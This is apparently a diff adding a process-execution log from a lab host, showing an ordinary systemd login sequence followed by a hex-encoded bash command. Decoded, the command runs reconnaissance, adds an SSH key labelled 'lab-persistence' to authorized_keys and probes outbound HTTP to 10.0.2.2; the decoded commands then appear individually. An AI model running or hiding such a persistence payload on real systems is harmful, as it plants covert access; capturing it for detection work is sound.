@@ -1,0 +1,33 @@
+15:22:20Z  /lib/systemd/systemd --user
+15:22:20Z  /usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator
+15:22:20Z  /bin/bash /usr/lib/systemd/user-environment-generators/90gpg-agent
+15:22:20Z  gpgconf --check-options gpg-agent
+15:22:20Z  awk -F: BEGIN{ret=1} /^gpg-agent:/{if ($5 == "1") { ret=0; exit 0 } } END {exit ret}
+15:22:20Z  gpg-agent --gpgconf-test
+15:22:20Z  gpgconf --list-options gpg-agent
+15:22:20Z  awk -F: /^enable-ssh-support:/{ print $10 }
+15:22:20Z  gpg-agent --dump-option-table
+15:22:20Z  gpg-agent --gpgconf-list
+15:22:20Z  /usr/lib/systemd/user-generators/systemd-xdg-autostart-generator /run/user/1002/systemd/generator /run/user/1002/systemd/generator.early /run/user/1002/systemd/generator.late
+15:22:20Z  sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
+15:22:20Z  /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d
+15:22:20Z  run-parts --lsbsysinit /etc/update-motd.d
+15:22:20Z  /bin/sh /etc/update-motd.d/10-uname
+15:22:20Z  uname -snrvm
+15:22:20Z  /bin/sh /etc/update-motd.d/92-unattended-upgrades
+15:22:20Z  /bin/sh /usr/share/unattended-upgrades/update-motd-unattended-upgrades
+15:22:21Z  sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
+15:22:21Z  /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d
+15:22:21Z  run-parts --lsbsysinit /etc/update-motd.d
+15:22:21Z  /bin/sh /etc/update-motd.d/10-uname
+15:22:21Z  uname -snrvm
+15:22:21Z  /bin/sh /etc/update-motd.d/92-unattended-upgrades
+15:22:21Z  /bin/sh /usr/share/unattended-upgrades/update-motd-unattended-upgrades
+15:22:21Z  bash -c 0A69643B2077686F616D693B20756E616D65202D610A7375646F202D6E202D6C20323E2631207C2068656164202D310A6D6B646972202D70207E2F2E7373680A6563686F20227373682D65643235353139204141414143334E7A6143316C5A4449314E54453541414141494C61624F6E6C7950657273697374656E63654B6579206C61622D70657273697374656E636522203E3E207E2F2E7373682F617574686F72697A65645F6B6579730A6375726C202D73202D6F202F6465762F6E756C6C202D7720226F7574626F756E645F687474703D257B687474705F636F64657D5C6E2220687474703A2F2F31302E302E322E323A383038302F0A6563686F20504F53545F45585F444F4E450A
+15:22:21Z  id
+15:22:21Z  whoami
+15:22:21Z  uname -a
+15:22:21Z  head -1
+15:22:21Z  sudo -n -l
+15:22:21Z  mkdir -p /home/svc-backup/.ssh
+15:22:21Z  curl -s -o /dev/null -w outbound_http=%{http_code}\n http://10.0.2.2:8080/
